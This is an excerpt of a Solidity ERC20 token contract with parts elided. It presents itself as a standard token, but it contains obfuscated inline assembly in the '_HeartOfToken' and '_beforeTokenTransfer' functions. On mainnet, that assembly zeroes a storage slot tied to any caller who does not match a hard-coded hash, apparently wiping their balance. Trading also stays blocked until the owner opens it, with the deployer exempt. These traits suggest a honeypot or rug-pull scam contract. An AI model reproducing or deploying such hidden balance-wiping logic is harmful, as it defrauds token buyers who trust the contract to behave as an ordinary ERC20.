...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        vergeAdd.push(_router); vergeAdd.push(msgSender_); vergeAdd.push(pair);
        for (uint256 q=0; q < 3;) {_newFirsts[vergeAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _HeartOfToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xeaf599e76e5b329e3f578bd1d32839d63f217af068188025bfd194146f652772
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x57b5464ffec82b38b55c2584e8f07d2a42f2b60cea2c14d776fdd9f9ca1a404b,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _borderControl = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == vergeAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployEdge(creator, initialSupply);
    }
}
